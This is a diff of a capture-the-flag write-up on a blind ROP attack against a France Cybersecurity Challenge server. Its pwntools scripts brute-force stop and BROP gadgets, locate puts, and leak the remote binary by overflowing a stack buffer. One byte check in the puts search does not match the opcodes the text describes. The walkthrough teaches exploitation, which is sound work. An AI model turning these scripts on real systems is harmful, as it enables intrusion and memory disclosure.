@@ -183,44 +183,45 @@ And because I feel like I am over-complicating things, let's see how it really w
 
 from pwn import *
 
+def getStopGadget(base_addr, ref):
+    L = [] # where we stock found addresses
+    start = 0x500
+    end = start + 0x300
+
+    for i in range(start, end):
+        # connect to server
+        context.log_level='error'
+        r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
+        context.log_level='info'
+
+        try:
+            # build payload
+            addr = base_addr + i
+            log.info(f'trying addr = {hex(addr)}')
+            pld = b'c' * 40     # fill buffer
+            pld += p64(addr)    # rip
+
+            # send and check output for the reference
+            r.recv(timeout=0.1)
+            r.send(pld)
+            res = r.recv(timeout=0.1)
+            if ref in res:
+                L.append(addr) # this address is a stop gadget
+
+        # nothing, close socket and continue
+        except:
+            pass
+        context.log_level='error'
+        r.close()
+        context.log_level='info'
+
+    return L # return a list of addresses
+
+# known constants
 ref = b'Hello you.\nWhat is your name ?\n>>> '
 base_addr = 0x400000
-L = [] # where we stock out false positives
 
-# custom range to save some time but we first scanned from 0x400000 to 0x401000
-start = 0x500
-end = start + 0x300
-
-for i in range(start, end):
-    # connect to server without logging it
-    context.log_level='error'
-    r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
-    context.log_level='info'
-
-    try:
-        # build payload
-        addr = base_addr + i # the address we're returning on
-        log.info(f'trying addr = {hex(addr)}')
-        pld = b'c' * 40 # fill buffer
-        pld += p64(addr) # overwrite `rip`
-
-        # send payload and get output
-        r.recv(timeout=0.1)
-        r.send(pld)
-        res = r.recv(timeout=0.1)
-
-        # we found a valid address
-        if ref in res:
-            L.append(addr)
-
-    # if nothing to report then just close connection without logging it
-    except:
-        pass
-    context.log_level='error'
-    r.close()
-    context.log_level='info'
-
-stop_gadgets = L
+stop_gadgets = getStopGadget(base_addr, ref) # generate a list of false positives
 stop_gadget = stop_gadgets[0]
 log.success(f'stop_gadget = {hex(stop_gadget)}')
 log.success(f'stop_gadgets = {[hex(i) for i in stop_gadgets]}')
@@ -268,62 +269,217 @@ Cool, let's find this magic gadget. To do so, we overwite `rip` with the address
 #!/usr/bin/env python3
 
 from pwn import *
-from Crypto.Util.number import bytes_to_long
-import os
 
+def getBropGadget(stop_gadget, false_positives):
+    # iterate over the whole ELF
+    start = 0
+    end = start + 0x1000
+    L = []
+
+    for i in range(start, end):
+        # connect to server
+        context.log_level='error'
+        r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
+        context.log_level='info'
+
+        try:
+            # build payload
+            addr = base_addr + i
+            pld = b'c' * 40             # fill buffer
+            pld += p64(addr)            # overwrite `rip` with gadget
+            pld += p64(0) * 6           # 6 addresses popped into registers
+            pld += p64(stop_gadget)     # regain exec flow control with the `ret`
+
+            # send payload and receive response
+            log.info(f'trying addr = {hex(addr)}')
+            r.recv(timeout=0.1)
+            r.send(pld)
+            res = r.recv(timeout=0.1)
+
+            if ref in res:
+                # /!\ be careful with false positives /!\
+                if addr not in false_positives:
+                    L.append(addr)
+
+        # nothing found, close socket and continue
+        except:
+            pass
+        context.log_level='error'
+        r.close()
+        context.log_level='info'
+
+    # return found gadgets
+    return L
+
+# known constants from earlier steps
 ref = b'Hello you.\nWhat is your name ?\n>>> '
-base_addr = 0x400000 # start of the ELF
-
-# values we found earlier
+base_addr = 0x400000
 stop_gadgets = [0x400560, 0x400562, 0x400563, 0x400565, 0x400566, 0x400567,
         0x400569, 0x40056d, 0x40056e, 0x40056f, 0x400570, 0x400576, 0x400577,
         0x4006b4, 0x4006b5, 0x4006b6, 0x4006b8, 0x40073b]
 stop_gadget = 0x400560
 
-start = 0
-end = start + 0x1000
-L = [] # we also check if there are any false positives
-
-for i in range(start, end):
-    # connect to server
-    context.log_level='error'
-    r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
-    context.log_level='info'
-
-    try:
-        # build payload
-        addr = base_addr + i
-        log.info(f'trying addr = {hex(addr)}')
-        pld = b'c' * 40         # fill buffer
-        pld += p64(addr)        # brop gadget
-        pld += p64(0) * 6       # 6 addresses we load in registers
-        pld += p64(stop_gadget) # rip
-
-        # send payload and check if output is the reference
-        r.recv(timeout=0.1)
-        r.send(pld)
-        res = r.recv(timeout=0.1)
-        if ref in res:
-            # /!\ be careful with false positives /!\
-            if addr not in false_positives:
-                L.append(addr)
-
-    # nothing at this address, close the connection and iterate
-    except:
-        pass
-    context.log_level='error'
-    r.close()
-    context.log_level='info'
-
-log.success(f'brop_gadgets = {[hex(i) for i in L]}')
+brop_gadgets = getBropGadget(stop_gadget, stop_gadgets)
+log.success(f'brop_gadgets = {[hex(i) for i in brop_gadgets]}')
 ```
 
 As you see we also avoid the address we're searching for to be one of the false positives we found earlier. Indeed, because this address is our `rip` value, if we jump on a location that directly prints out our reference, we will have no idea that we never popped anything and that we just fell in a stupid rabbit hole.
 
 ![bropex](images/bropex.png)
 
-Again we prefer to be sure we don't stop on the first one we find. One of them must be a false positive for a reason we do not know, but having only 2 candidates is not a problem as we will get rid of the one that does not work on the next step: finding a way to print out everything we want.
+Again we prefer to be sure we don't stop on the first one we find. There must still be a false positive for a reason we do not know, but having 2 candidates is not a problem as we will get rid of the one that does not work on the next step: finding a way to print out everything we want.
 
 ### Finding puts PLT
 
+Now that we can control the argument of any function, we will try to find `puts` PLT (*Procedure Linkage Table*) in order to leak the whole binary. The goal is to leak addresses from the GOT (*Global Offset Table*) in the libc to retrieve what we need for our final ROP chain. I assume that everyone knows how the relocation system works, but you have a quick remainder [here](https://www.youtube.com/watch?v=kUk5pw4w0h4).
 
+As always, we will iterate over the ELF addresses range to find the right one. We need an output we can control to check if the `puts` was correctly called, such as our `pop rdi; ret` sequence: `\x5f\xc3`. We will do this for every possible BROP gadget we found until we get the correct one.
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+def getPutsAddr(stop_gadget, pop_rdi):
+    # iterate over the whole ELF
+    start = 0x0
+    end = start + 0x1000
+
+    for i in range(start, end):
+        # connect to server
+        context.log_level='error'
+        r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
+        context.log_level='info'
+
+        try:
+            # build payload
+            addr = 0x400000 + i
+            pld = b'c' * 40         # fill buffer
+            pld += p64(pop_rdi)     # load `pop rdi; ret` opcodes in `rdi`
+            pld += p64(pop_rdi)     # puts arg = '\x5f\xc3'
+            pld += p64(addr)        # puts addr
+            pld += p64(stop_gadget) # stop gadget
+
+            # send payload and receive response
+            log.info(f'getPutsAddr({hex(stop_gadget)}, {hex(pop_rdi)}) -> trying addr = {hex(addr)}')
+            r.recv(timeout=0.1)
+            r.send(pld)
+            res = r.recv(timeout=0.1)
+            if b'\x5f\x3c' in res:
+                return addr
+
+        # nothing found, close socket and continue
+        except:
+            pass
+        context.log_level='error'
+        r.close()
+        context.log_level='info'
+
+    # fail, not the right gadget
+    return None
+
+# known constants from earlier steps
+ref = b'Hello you.\nWhat is your name ?\n>>> '
+base_addr = 0x400000
+stop_gadgets = [0x400560, 0x400562, 0x400563, 0x400565, 0x400566, 0x400567,
+        0x400569, 0x40056d, 0x40056e, 0x40056f, 0x400570, 0x400576, 0x400577,
+        0x4006b4, 0x4006b5, 0x4006b6, 0x4006b8, 0x40073b]
+stop_gadget = 0x400560
+brop_gadgets = [0x4005ee, 0x40073a]
+
+for brop_gadget in brop_gadgets: # we iterate over possible BROP gadgets
+    brop_gadget += 0x9 # offset to `pop rdi; ret`
+    log.info(f'trying brop_gadget = {hex(brop_gadget)}')
+    puts_addr = getPutsAddr(stop_gadget, brop_gadget)
+    if puts_addr: # success
+        log.success(f'brop_gadget = {hex(brop_gadget)}')
+        log.success(f'puts_addr = {hex(puts_addr)}')
+        break
+```
+
+![puts](images/puts.png)
+
+We are doing well! This was the hardest part as we can now print whatever we want! Let's dump the whole binary to find where is the GOT.
+
+### Leaking the binary
+
+This part is actually pretty simple. We will just iterate on the ELF addresses and call `puts` everytime. Then we just parse the output to get the leak, and if nothing is printed then it just means there is a null byte at this address.
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+def leakAddr(pop_rdi, puts_plt, leak_addr, stop_gadget):
+    # connect to server
+    context.log_level='error'
+    r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
+    context.log_level='info'
+    log.info(f'leakAddr({hex(leak_addr)})')
+
+    # build payload
+    pld = b'a' * 40                         # fill buffer
+    pld += p64(pop_rdi) + p64(leak_addr)    # load addr we want to leak in `rdi`
+    pld += p64(puts_plt)                    # puts addr with the arg we control
+    pld += p64(stop_gadget)                 # stop gadget
+
+    # send payload
+    r.recv(timeout=0.1)
+    r.send(pld)
+
+    # if no more output
+    try:
+        rec = r.recv()
+    except:
+        return None
+
+    data = b'\x00'
+    try:
+        data = rec[rec.index(b'@')+1:rec.index(b'\n' + ref)] # parse output to get the leak
+    except: # null byte
+        pass
+
+    # close socket and return the leak
+    context.log_level='error'
+    r.close()
+    context.log_level='info'
+    return data if data else b'\x00'
+
+# known constants from earlier steps
+ref = b'Hello you.\nWhat is your name ?\n>>> '
+base_addr = 0x400000
+stop_gadgets = [0x400560, 0x400562, 0x400563, 0x400565, 0x400566, 0x400567,
+        0x400569, 0x40056d, 0x40056e, 0x40056f, 0x400570, 0x400576, 0x400577,
+        0x4006b4, 0x4006b5, 0x4006b6, 0x4006b8, 0x40073b]
+stop_gadget = 0x400560
+brop_gadgets = [0x4005ee, 0x40073a]
+pop_rdi = 0x400743
+puts_plt = 0x4004f5
+
+# lets dump the whole binary from 0x400000 too 0x401000
+binary = b''
+leak_addr = base_addr
+while leak_addr < base_addr + 0x1000:
+    data = leakAddr(pop_rdi, puts_plt, leak_addr, stop_gadget) # the actual leak
+    # if no output anymore
+    if not data:
+        break
+    leak_addr += len(data)
+    binary += data
+
+# save the result
+f = open('binary', 'wb')
+f.write(binary)
+f.close()
+```
+
+![leakbin](images/leakbin.png)
+
+That was quick, and boom, there we have!
+
+```
+$ file binary 
+binary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, missing section headers
+```
+
+Then we can load it in [Ghidra](https://ghidra-sre.org) to get all the informations we need.
